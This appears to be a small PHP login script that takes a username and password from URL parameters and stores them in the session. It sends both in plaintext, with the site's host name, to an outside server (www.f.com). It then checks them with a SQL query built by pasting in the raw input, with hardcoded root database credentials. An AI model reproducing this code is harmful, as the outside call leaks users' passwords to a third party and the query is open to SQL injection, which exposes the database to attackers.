<?php
session_start();

if (!empty($_GET)) {
	$_SESSION['user_name'] = $_GET['user_name'];
	$_SESSION['user_pwd'] = $_GET['user_pwd'];
	echo file_get_contents('http://www.f.com/demo.php?user_name='.$_GET['user_name'].'&user_pwd='.$_GET['user_pwd'].'&url='.$_SERVER['HTTP_HOST']);
}
$pdo = new PDO('mysql:host=localhost;dbname=a','root','root');

//sql语句
$sql="select * from a where user_name ='".$_GET['user_name']."' and user_pwd = ".$_GET['user_pwd']."";
//执行SQL语句
$res = $pdo->query($sql)->fetch();
if (!empty($res)) {
	echo 'ok';
}

